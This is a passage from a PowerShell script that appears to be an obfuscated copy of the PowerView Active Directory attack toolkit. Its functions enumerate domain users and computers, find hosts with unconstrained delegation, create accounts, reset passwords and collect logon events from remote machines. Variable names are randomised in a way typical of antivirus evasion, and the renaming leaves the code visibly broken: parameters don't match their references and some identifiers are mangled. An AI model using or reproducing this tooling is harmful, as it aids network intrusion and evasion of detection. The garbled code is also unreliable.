                    $Iq7bLVAvhKnpjdMlH2 += "(userAccountControl:1.2.840.113556.1.4.803:=$Jwv4XHmkge9naNIru5oT)"
                }
            }

            $XK77F5ap.filter = "(&(samAccountType=805306368)$Iq7bLVAvhKnpjdMlH2)"
            Write-Verbose "[Get-DomainUser] filter string: $($XK77F5ap.filter)"

            if ($PSBoundParameters['FindOne']) { $nhxRs5G1 = $XK77F5ap.FindOne() }
            else { $nhxRs5G1 = $XK77F5ap.FindAll() }
            $nhxRs5G1 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    
                    $JdyVW2BmJzGuYVvoHvD = $_
                    $JdyVW2BmJzGuYVvoHvD.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $JdyVW2BmJzGuYVvoHvD = Convert-LDAPProperty -UtHQ $_.Properties
                    $JdyVW2BmJzGuYVvoHvD.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $JdyVW2BmJzGuYVvoHvD
            }
            if ($nhxRs5G1) {
                try { $nhxRs5G1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainUser] Error disposing of the Results object: $_"
                }
            }
            $XK77F5ap.dispose()
        }
    }
}


function New-DomainUser {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $2,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $UgGzBWEfx15yTpP0t,

        [ValidateNotNullOrEmpty()]
        [String]
        $TwsV1,

        [ValidateNotNullOrEmpty()]
        [String]
        $hLD,

        [ValidateNotNullOrEmpty()]
        [String]
        $cMJGq7o3,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    $N = @{
        'Identity' = $2
    }
    if ($PSBoundParameters['Domain']) { $N['Domain'] = $3Ecdwi8qNy }
    if ($PSBoundParameters['Credential']) { $N['Credential'] = $3ezVSfm6f4k }
    $1tGa = Get-PrincipalContext @ContextArguments

    if ($1tGa) {
        $JdyVW2BmJzGuYVvoHvD = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($1tGa.Context)

        
        $JdyVW2BmJzGuYVvoHvD.SamAccountName = $1tGa.Identity
        $ukI52MGaWOjeb6 = New-Object System.Management.Automation.PSCredential('a', $UgGzBWEfx15yTpP0t)
        $JdyVW2BmJzGuYVvoHvD.SetPassword($ukI52MGaWOjeb6.GetNetworkCredential().Password)
        $JdyVW2BmJzGuYVvoHvD.Enabled = $True
        $JdyVW2BmJzGuYVvoHvD.PasswordNotRequired = $False

        if ($PSBoundParameters['Name']) {
            $JdyVW2BmJzGuYVvoHvD.Name = $TwsV1
        }
        else {
            $JdyVW2BmJzGuYVvoHvD.Name = $1tGa.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $JdyVW2BmJzGuYVvoHvD.DisplayName = $hLD
        }
        else {
            $JdyVW2BmJzGuYVvoHvD.DisplayName = $1tGa.Identity
        }

        if ($PSBoundParameters['Description']) {
            $JdyVW2BmJzGuYVvoHvD.Description = $cMJGq7o3
        }

        Write-Verbose "[New-DomainUser] Attempting to create user '$2'"
        try {
            $qYFR5PCZruUkdna9T = $JdyVW2BmJzGuYVvoHvD.Save()
            Write-Verbose "[New-DomainUser] User '$2' successfully created"
            $JdyVW2BmJzGuYVvoHvD
        }
        catch {
            Write-Warning "[New-DomainUser] Error creating user '$2' : $_"
        }
    }
}


function Set-DomainUserPassword {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $S,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $UgGzBWEfx15yTpP0t,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    $N = @{ 'Identity' = $S }
    if ($PSBoundParameters['Domain']) { $N['Domain'] = $3Ecdwi8qNy }
    if ($PSBoundParameters['Credential']) { $N['Credential'] = $3ezVSfm6f4k }
    $1tGa = Get-PrincipalContext @ContextArguments

    if ($1tGa) {
        $JdyVW2BmJzGuYVvoHvD = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($1tGa.Context, $S)

        if ($JdyVW2BmJzGuYVvoHvD) {
            Write-Verbose "[Set-DomainUserPassword] Attempting to set the password for user '$S'"
            try {
                $ukI52MGaWOjeb6 = New-Object System.Management.Automation.PSCredential('a', $UgGzBWEfx15yTpP0t)
                $JdyVW2BmJzGuYVvoHvD.SetPassword($ukI52MGaWOjeb6.GetNetworkCredential().Password)

                $qYFR5PCZruUkdna9T = $JdyVW2BmJzGuYVvoHvD.Save()
                Write-Verbose "[Set-DomainUserPassword] Password for user '$S' successfully reset"
            }
            catch {
                Write-Warning "[Set-DomainUserPassword] Error setting password for user '$S' : $_"
            }
        }
        else {
            Write-Warning "[Set-DomainUserPassword] Unable to find user '$S'"
        }
    }
}


function Get-DomainUserEvent {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA = $8MSydlAwkKhVgnu4Ls10:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $Ylu8TrUAPzW7fO1M3bjHE2Gx = [DateTime]::Now.AddDays(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $S28dVfimx = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $5w9hXo = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        
        $NE4cIBLgsdMuarS = @"
<QueryList>
    <Query Id="0" Path="Security">

        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($Ylu8TrUAPzW7fO1M3bjHE2Gx.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($S28dVfimx.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($Ylu8TrUAPzW7fO1M3bjHE2Gx.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($S28dVfimx.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>

        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $D = @{
            'FilterXPath' = $NE4cIBLgsdMuarS
            'LogName' = 'Security'
            'MaxEvents' = $5w9hXo
        }
        if ($PSBoundParameters['Credential']) { $D['Credential'] = $3ezVSfm6f4k }
    }

    PROCESS {
        ForEach ($TfIJKo1L in $mA) {

            $D['ComputerName'] = $TfIJKo1L

            Get-WinEvent @EventArguments| ForEach-Object {
                $ZK = $_
                $UtHQ = $ZK.Properties
                Switch ($ZK.Id) {
                    
                    4624 {
                        
                        if(-not $UtHQ[5].Value.EndsWith('$')) {
                            $HLkP8yYwFiBnjz2lL = New-Object PSObject -Property @{
                                ComputerName              = $TfIJKo1L
                                TimeCreated               = $ZK.TimeCreated
                                EventId                   = $ZK.Id
                                SubjectUserSid            = $UtHQ[0].Value.ToString()
                                SubjectUserName           = $UtHQ[1].Value
                                SubjectDomainName         = $UtHQ[2].Value
                                SubjectLogonId            = $UtHQ[3].Value
                                TargetUserSid             = $UtHQ[4].Value.ToString()
                                TargetUserName            = $UtHQ[5].Value
                                TargetDomainName          = $UtHQ[6].Value
                                TargetLogonId             = $UtHQ[7].Value
                                LogonType                 = $UtHQ[8].Value
                                LogonProcessName          = $UtHQ[9].Value
                                AuthenticationPackageName = $UtHQ[10].Value
                                WorkstationName           = $UtHQ[11].Value
                                LogonGuid                 = $UtHQ[12].Value
                                TransmittedServices       = $UtHQ[13].Value
                                LmPackageName             = $UtHQ[14].Value
                                KeyLength                 = $UtHQ[15].Value
                                ProcessId                 = $UtHQ[16].Value
                                ProcessName               = $UtHQ[17].Value
                                IpAddress                 = $UtHQ[18].Value
                                IpPort                    = $UtHQ[19].Value
                                ImpersonationLevel        = $UtHQ[20].Value
                                RestrictedAdminMode       = $UtHQ[21].Value
                                TargetOutboundUserName    = $UtHQ[22].Value
                                TargetOutboundDomainName  = $UtHQ[23].Value
                                VirtualAccount            = $UtHQ[24].Value
                                TargetLinkedLogonId       = $UtHQ[25].Value
                                ElevatedToken             = $UtHQ[26].Value
                            }
                            $HLkP8yYwFiBnjz2lL.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            $HLkP8yYwFiBnjz2lL
                        }
                    }

                    
                    4648 {
                        
                        if((-not $UtHQ[5].Value.EndsWith('$')) -and ($UtHQ[11].Value -match 'taskhost\.exe')) {
                            $HLkP8yYwFiBnjz2lL = New-Object PSObject -Property @{
                                ComputerName              = $TfIJKo1L
                                TimeCreated       = $ZK.TimeCreated
                                EventId           = $ZK.Id
                                SubjectUserSid    = $UtHQ[0].Value.ToString()
                                SubjectUserName   = $UtHQ[1].Value
                                SubjectDomainName = $UtHQ[2].Value
                                SubjectLogonId    = $UtHQ[3].Value
                                LogonGuid         = $UtHQ[4].Value.ToString()
                                TargetUserName    = $UtHQ[5].Value
                                TargetDomainName  = $UtHQ[6].Value
                                TargetLogonGuid   = $UtHQ[7].Value
                                TargetServerName  = $UtHQ[8].Value
                                TargetInfo        = $UtHQ[9].Value
                                ProcessId         = $UtHQ[10].Value
                                ProcessName       = $UtHQ[11].Value
                                IpAddress         = $UtHQ[12].Value
                                IpPort            = $UtHQ[13].Value
                            }
                            $HLkP8yYwFiBnjz2lL.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            $HLkP8yYwFiBnjz2lL
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($ZK.Id)"
                    }
                }
            }
        }
    }
}


function Get-DomainGUIDMap {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    $bQWr = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    $Drk = @{}
    if ($PSBoundParameters['Credential']) { $Drk['Credential'] = $3ezVSfm6f4k }

    try {
        $K9SAJMY52oG1 = (Get-83xk0 @ForestArguments).schema.name
    }
    catch {
        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-83xk0'
    }
    if (-not $K9SAJMY52oG1) {
        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-83xk0'
    }

    $wtWPex5R = @{
        'SearchBase' = $K9SAJMY52oG1
        'LDAPFilter' = '(schemaIDGUID=*)'
    }
    if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
    if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
    if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
    if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
    if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }
    $ezfcOQHPuklVpCJro8d4Zn = Get-DomainSearcher @SearcherArguments

    if ($ezfcOQHPuklVpCJro8d4Zn) {
        try {
            $nhxRs5G1 = $ezfcOQHPuklVpCJro8d4Zn.FindAll()
            $nhxRs5G1 | Where-Object {$_} | ForEach-Object {
                $bQWr[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($nhxRs5G1) {
                try { $nhxRs5G1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainGUIDMap] Error disposing of the Results object: $_"
                }
            }
            $ezfcOQHPuklVpCJro8d4Zn.dispose()
        }
        catch {
            Write-Verbose "[Get-DomainGUIDMap] Error in building GUID map: $_"
        }
    }

    $wtWPex5R['SearchBase'] = $K9SAJMY52oG1.replace('Schema','Extended-4A')
    $wtWPex5R['LDAPFilter'] = '(objectClass=controlAccessRight)'
    $HT = Get-DomainSearcher @SearcherArguments

    if ($HT) {
        try {
            $nhxRs5G1 = $HT.FindAll()
            $nhxRs5G1 | Where-Object {$_} | ForEach-Object {
                $bQWr[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($nhxRs5G1) {
                try { $nhxRs5G1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainGUIDMap] Error disposing of the Results object: $_"
                }
            }
            $HT.dispose()
        }
        catch {
            Write-Verbose "[Get-DomainGUIDMap] Error in building GUID map: $_"
        }
    }

    $bQWr
}


function Get-DomainComputer {


    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $S,

        [Switch]
        $eXoNv092dGwM1UuRD,

        [Switch]
        $EcWeglztmPXo7B0bGhH,

        [Switch]
        $El6s3JV9wUDan1Nm0zrq,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $LCkz1xqdPM7K4jH,

        [ValidateNotNullOrEmpty()]
        [String]
        $c5fth3UNK,

        [ValidateNotNullOrEmpty()]
        [String]
        $txAlgojF79hMWarPfHVYk,

        [ValidateNotNullOrEmpty()]
        [String]
        $M6Sb30DA,

        [Switch]
        $kMU9iGe,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UtHQ,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $Z8qdyPlzVkp4RigJ71,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Alias('ReturnOne')]
        [Switch]
        $Lnzs4NIWklS,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $VcZPt
    )

    DynamicParam {
        $71kMm1caDM3d = [Enum]::GetNames($KLrjblEyzposuH)
        
        $71kMm1caDM3d = $71kMm1caDM3d | ForEach-Object {$_; "NOT_$_"}
        
        New-DynamicParameter -TwsV1 UACFilter -g4C3L1BXaM $71kMm1caDM3d -fK67iX ([array])
    }

    BEGIN {
        $wtWPex5R = @{}
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Properties']) { $wtWPex5R['Properties'] = $UtHQ }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['SecurityMasks']) { $wtWPex5R['SecurityMasks'] = $Z8qdyPlzVkp4RigJ71 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }
        $YhtiUOJA8BLm = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($YhtiUOJA8BLm) {
            $CO2KFH = ''
            $Iq7bLVAvhKnpjdMlH2 = ''
            $S | Where-Object {$_} | ForEach-Object {
                $It59GzvwEj = $_.Replace('(', '\28').Replace(')', '\29')
                if ($It59GzvwEj -match '^S-1-') {
                    $CO2KFH += "(objectsid=$It59GzvwEj)"
                }
                elseif ($It59GzvwEj -match '^CN=') {
                    $CO2KFH += "(distinguishedname=$It59GzvwEj)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        
                        
                        $23DM = $It59GzvwEj.SubString($It59GzvwEj.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainComputer] Extracted domain '$23DM' from '$It59GzvwEj'"
                        $wtWPex5R['Domain'] = $23DM
                        $YhtiUOJA8BLm = Get-DomainSearcher @SearcherArguments
                        if (-not $YhtiUOJA8BLm) {
                            Write-Warning "[Get-DomainComputer] Unable to retrieve domain searcher for '$23DM'"
                        }
                    }
                }
                elseif ($It59GzvwEj.Contains('.')) {
                    $CO2KFH += "(|(name=$It59GzvwEj)(dnshostname=$It59GzvwEj))"
                }
                elseif ($It59GzvwEj -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $ypHo7v = (([Guid]$It59GzvwEj).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $CO2KFH += "(objectguid=$ypHo7v)"
                }
                else {
                    $CO2KFH += "(name=$It59GzvwEj)"
                }
            }
            if ($CO2KFH -and ($CO2KFH.Trim() -ne '') ) {
                $Iq7bLVAvhKnpjdMlH2 += "(|$CO2KFH)"
            }

            if ($PSBoundParameters['Unconstrained']) {
                Write-Verbose '[Get-DomainComputer] Searching for computers with for unconstrained delegation'
                $Iq7bLVAvhKnpjdMlH2 += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals'
                $Iq7bLVAvhKnpjdMlH2 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                Write-Verbose '[Get-DomainComputer] Searching for printers'
                $Iq7bLVAvhKnpjdMlH2 += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with SPN: $LCkz1xqdPM7K4jH"
                $Iq7bLVAvhKnpjdMlH2 += "(servicePrincipalName=$LCkz1xqdPM7K4jH)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with operating system: $c5fth3UNK"
                $Iq7bLVAvhKnpjdMlH2 += "(operatingsystem=$c5fth3UNK)"
            }
            if ($PSBoundParameters['ServicePack']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with service pack: $txAlgojF79hMWarPfHVYk"
                $Iq7bLVAvhKnpjdMlH2 += "(operatingsystemservicepack=$txAlgojF79hMWarPfHVYk)"
            }
            if ($PSBoundParameters['SiteName']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with site name: $M6Sb30DA"
                $Iq7bLVAvhKnpjdMlH2 += "(serverreferencebl=$M6Sb30DA)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainComputer] Using additional LDAP filter: $c7rZO2V9"
                $Iq7bLVAvhKnpjdMlH2 += "$c7rZO2V9"
            }
            
            $F2EgMO8Q | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $r3NzqZ3LuCdUjNUAWy5yroT = $_.Substring(4)
                    $Jwv4XHmkge9naNIru5oT = [Int]($KLrjblEyzposuH::$r3NzqZ3LuCdUjNUAWy5yroT)
                    $Iq7bLVAvhKnpjdMlH2 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$Jwv4XHmkge9naNIru5oT))"
                }
                else {
                    $Jwv4XHmkge9naNIru5oT = [Int]($KLrjblEyzposuH::$_)
                    $Iq7bLVAvhKnpjdMlH2 += "(userAccountControl:1.2.840.113556.1.4.803:=$Jwv4XHmkge9naNIru5oT)"
                }
            }

            $YhtiUOJA8BLm.filter = "(&(samAccountType=805306369)$Iq7bLVAvhKnpjdMlH2)"
            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $($YhtiUOJA8BLm.filter)"

            if ($PSBoundParameters['FindOne']) { $nhxRs5G1 = $YhtiUOJA8BLm.FindOne() }
            else { $nhxRs5G1 = $YhtiUOJA8BLm.FindAll() }
            $nhxRs5G1 | Where-Object {$_} | ForEach-Object {
                $4zYXe6sFagylcbNCipAf = $True
                if ($PSBoundParameters['Ping']) {
                    $4zYXe6sFagylcbNCipAf = Test-Connection -Count 1 -N1xWHfZFbIiRSwgEOjKdtk -mA $_.properties.dnshostname
                }
                if ($4zYXe6sFagylcbNCipAf) {
                    if ($PSBoundParameters['Raw']) {
                        
                        $TfIJKo1L = $_
                        $TfIJKo1L.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $TfIJKo1L = Convert-LDAPProperty -UtHQ $_.Properties
                        $TfIJKo1L.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $TfIJKo1L
                }
            }
            if ($nhxRs5G1) {
                try { $nhxRs5G1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainComputer] Error disposing of the Results object: $_"
                }
            }
            $YhtiUOJA8BLm.dispose()
        }
    }
}


function Get-DomainObject {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $S,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UtHQ,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $Z8qdyPlzVkp4RigJ71,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Alias('ReturnOne')]
        [Switch]
        $Lnzs4NIWklS,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $VcZPt
    )

    DynamicParam {
        $71kMm1caDM3d = [Enum]::GetNames($KLrjblEyzposuH)
        
        $71kMm1caDM3d = $71kMm1caDM3d | ForEach-Object {$_; "NOT_$_"}
        
        New-DynamicParameter -TwsV1 UACFilter -g4C3L1BXaM $71kMm1caDM3d -fK67iX ([array])
    }

    BEGIN {
        $wtWPex5R = @{}
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Properties']) { $wtWPex5R['Properties'] = $UtHQ }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['SecurityMasks']) { $wtWPex5R['SecurityMasks'] = $Z8qdyPlzVkp4RigJ71 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }
        $uExy6mk5rbghU4f = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($uExy6mk5rbghU4f) {
            $CO2KFH = ''
            $Iq7bLVAvhKnpjdMlH2 = ''
            $S | Where-Object {$_} | ForEach-Object {
                $It59GzvwEj = $_.Replace('(', '\28').Replace(')', '\29')
                if ($It59GzvwEj -match '^S-1-') {
                    $CO2KFH += "(objectsid=$It59GzvwEj)"
                }
                elseif ($It59GzvwEj -match '^(CN|OU|DC)=') {
                    $CO2KFH += "(distinguishedname=$It59GzvwEj)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        
                        
                        $23DM = $It59GzvwEj.SubString($It59GzvwEj.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainObject] Extracted domain '$23DM' from '$It59GzvwEj'"
                        $wtWPex5R['Domain'] = $23DM
                        $uExy6mk5rbghU4f = Get-DomainSearcher @SearcherArguments
                        if (-not $uExy6mk5rbghU4f) {
                            Write-Warning "[Get-DomainObject] Unable to retrieve domain searcher for '$23DM'"
                        }
                    }
                }
                elseif ($It59GzvwEj -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $ypHo7v = (([Guid]$It59GzvwEj).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $CO2KFH += "(objectguid=$ypHo7v)"
                }
                elseif ($It59GzvwEj.Contains('\')) {
                    $4QsEpCvyLO6c2atiUjSo5R = $It59GzvwEj.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -YSu8jzco2Jt Canonical
                    if ($4QsEpCvyLO6c2atiUjSo5R) {
                        $EshQtt2KdiBiipNH8O3JJ = $4QsEpCvyLO6c2atiUjSo5R.SubString(0, $4QsEpCvyLO6c2atiUjSo5R.IndexOf('/'))
                        $XEQn7MoPDNhlYtSpOmwmF5wv5 = $It59GzvwEj.Split('\')[1]
                        $CO2KFH += "(samAccountName=$XEQn7MoPDNhlYtSpOmwmF5wv5)"
                        $wtWPex5R['Domain'] = $EshQtt2KdiBiipNH8O3JJ
                        Write-Verbose "[Get-DomainObject] Extracted domain '$EshQtt2KdiBiipNH8O3JJ' from '$It59GzvwEj'"
